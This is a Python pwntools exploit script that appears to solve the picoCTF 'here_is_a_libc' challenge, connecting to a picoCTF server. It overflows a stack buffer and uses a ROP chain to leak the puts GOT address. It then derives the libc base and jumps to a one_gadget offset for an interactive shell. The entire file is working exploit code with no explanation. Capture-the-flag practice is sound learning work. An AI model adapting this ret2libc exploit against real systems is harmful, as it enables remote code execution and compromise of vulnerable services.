#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


if __name__ == '__main__':
    context.terminal = ['tmux', 'sp', '-h']
    context.log_level = "debug"

    chall = "./here_is_a_libc"
    libc = ELF("../libc.so.6")
    elf = ELF(chall)
    context.binary = chall
    context.binary.checksec()

    if len(argv) >= 2 and argv[1] == "r":
        p = remote("mercury.picoctf.net", 49464)
    elif len(argv) >= 2 and argv[1] == "d":
    	cmd = """
    		b *do_stuff+152
    		c
    	"""
    	p = gdb.debug(chall,cmd)
    else:
        p = process(chall)


    rop_pop_rdi_ret = 0x00400913
    payload = b"A" * 100
    payload += b"B" * 0x8 * 4
    payload += b"C" * 4
    payload += p64(rop_pop_rdi_ret)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['do_stuff'])

    p.recvuntil("!")
    p.sendline(payload)

    p.recvuntil('d\n')
    puts_got_addr = u64(p.recv(6) + b'\0' * 2)
    log.info("puts@got: " + hex(puts_got_addr))
    libc_base = puts_got_addr - libc.symbols['puts']
    log.info("libc base: " + hex(libc_base))

    onegadget_offset = 0x10a45c

    payload = b"A" * 100
    payload += b"B" * 0x8 * 4
    payload += b"C" * 4
    payload += p64(libc_base + onegadget_offset)

    p.sendline(payload)

    p.interactive()
